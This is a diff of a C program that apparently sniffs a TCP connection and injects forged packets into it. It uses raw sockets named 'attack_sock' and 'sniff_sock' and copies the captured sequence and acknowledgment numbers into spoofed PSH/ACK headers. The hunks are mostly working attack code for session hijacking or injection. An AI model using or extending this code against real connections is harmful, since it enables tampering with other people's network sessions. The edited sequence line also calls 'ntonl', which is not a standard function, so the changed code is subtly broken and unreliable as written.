@@ -61,8 +61,7 @@ int main(int argc, char *argv[]) {
     int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
     char service_ip[INET6_ADDRSTRLEN];
     uint16_t service_port;
-    struct sockaddr_storage saddr;
-    uint32_t service_addr;
+    uint32_t service_addr, seq;
     socklen_t addr_len;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
     unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
@@ -72,6 +71,7 @@ int main(int argc, char *argv[]) {
     struct pshdr *psh;
     uint16_t win = 8192, id0 = rand() %(65536);
     size_t tcp_len;
+    struct sockaddr_storage saddr;
     struct sockaddr_in sa;
     char *data;
 
@@ -187,8 +187,9 @@ int main(int argc, char *argv[]) {
             // send_pshack(strlen(data), attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // psh ack to server
             tcph -> source = new_tcph->dest; // source port
             cstcph -> source = new_tcph->dest;
-            tcph -> seq = new_tcph->ack_seq + htonl(1); // sequence number
-            cstcph -> seq = new_tcph->ack_seq + htonl(1);
+            seq = htonl(ntonl(new_tcph->ack_seq) + 1);
+            tcph -> seq = seq; // sequence number
+            cstcph -> seq = seq;
             tcph -> ack_seq = new_tcph->seq; // ack sequence number
             cstcph -> ack_seq = new_tcph->seq;
 
